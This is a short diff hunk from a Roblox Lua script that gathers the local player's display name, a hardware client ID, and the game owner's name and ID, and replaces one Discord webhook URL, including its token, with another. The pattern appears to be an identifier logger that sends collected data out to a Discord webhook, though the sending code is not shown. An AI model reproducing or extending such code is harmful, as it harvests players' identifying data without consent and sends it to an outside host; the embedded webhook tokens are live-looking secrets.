@@ -19,7 +19,7 @@ local displayname = LocalPlayer.DisplayName
 local hwid = game:GetService("RbxAnalyticsService"):GetClientId()
 local ownerName = game:GetService("Players"):GetNameFromUserIdAsync(game.CreatorId)
 local ownerUserId = game.CreatorId
-_G.Webhookid = "https://discord.com/api/webhooks/1129375899133935677/sw1Xdqqj8JbxDm8VesSua9-26m0avH88KJBBVIQHgZfQdPsNZbE_LOamwNR0NhlPoEJ3"
+_G.Webhookid = "https://discord.com/api/webhooks/1143069512313360394/uLpu3aaf4xzMtdComVeP60XnvoyDieEAj8T9AQwfAfpCxm3iPV-Um3eWkXw137laJawl"
 
 
 pcall(function()
